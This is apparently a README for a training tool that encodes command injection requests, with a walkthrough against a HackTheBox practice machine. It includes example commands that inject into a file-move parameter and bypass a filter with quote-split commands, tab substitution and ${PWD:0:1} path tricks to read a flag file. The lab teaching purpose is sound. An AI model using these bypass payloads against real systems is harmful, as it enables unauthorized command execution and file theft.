# Command Injection Request Encoder

⚠️ The tool is experimental, use at your own risk ⚠️

Command Injection Request Encoder (cire) is a tool that can be used to encode requests for pseudo-manual command injection exploitation. This tool was developed for training purposes.

#### Testing

We can test the tool on the following practice CTF machine: `https://academy.hackthebox.com/module/109/section/1042`.

* We can try to inject something in every parameter of every request

```ps
$ ./main.py -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';' -v
```

The following requests result in an error displayed to the URL indicating that the command `mv` failed (missing operand). **The parameter is vulnerable.**

Trying payloads with well-known commands such as `;id`, `;pwd` or `;cat` are filtered (`Malicious request denied!`) while `;w` works fine. Commands such as `;c""at` are by-passing the filter.

```ps
$ ./main.py -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';c""at' -v
```

Spaces are filtered. We can use tabs using the placeholder `<tab>`.

```ps
$ ./main.py -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';c""at<tab>' -v
```

We need to build a path. `..` is allowed, while `../` is filtered. We can use variables:

```ps
$ ./main.py -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';ca""t<tab>..${PWD:0:1}..${PWD:0:1}..${PWD:0:1}..${PWD:0:1}flag.txt' -v
```